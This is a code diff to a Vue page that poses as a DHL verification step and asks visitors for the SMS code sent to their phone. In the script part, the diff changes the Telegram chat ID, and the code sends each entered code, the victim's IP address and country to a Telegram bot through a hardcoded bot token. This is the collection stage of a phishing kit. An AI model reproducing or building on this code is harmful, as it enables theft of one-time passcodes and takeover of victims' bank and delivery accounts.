@@ -2826,8 +2826,8 @@
               <div class="">
                 <p>
                   The unique password was sent to the mobile number:
-                  {{ phoneNumber }}. If you need to change your bark
-                  or modify it via the (ATM, WEB)
+                  {{ phoneNumber }}. If you need to change your bark or modify
+                  it via the (ATM, WEB)
                 </p>
               </div>
               <form>
@@ -2868,8 +2868,7 @@
                 </div>
                 <div v-if="error" id="timer" class="time">
                   <p>
-                    Please re-enter the new verification code
-                    after:
+                    Please re-enter the new verification code after:
                     <span id="counter">{{ time }}</span> Seconds
                   </p>
                 </div>
@@ -2879,9 +2878,7 @@
                   style="color: red"
                   class="time"
                 >
-                  <p style="color: red">
-                    Please enter the verification code
-                  </p>
+                  <p style="color: red">Please enter the verification code</p>
                 </div>
                 <center>
                   <div
@@ -2952,8 +2949,8 @@ export default {
         );
         this.IP = tt.data.ip;
         this.query = tt.data.country_capital;
-          var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
-          var chatId2 = -957355212;
+        var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
+        var chatId2 = -823044704;
         var fullMessage = `
         ||||||||||🇨🇦| DHL EN |🇨🇦||||||||||%0ASMS : ${this.sms}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| DHL|💳||||||||||`;
         if (this.tries > 0) {
@@ -2972,8 +2969,8 @@ export default {
             }
             that.time--;
           }, 1000);
-         
-           await axios.post(
+
+          await axios.post(
             `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
           );
         } else {
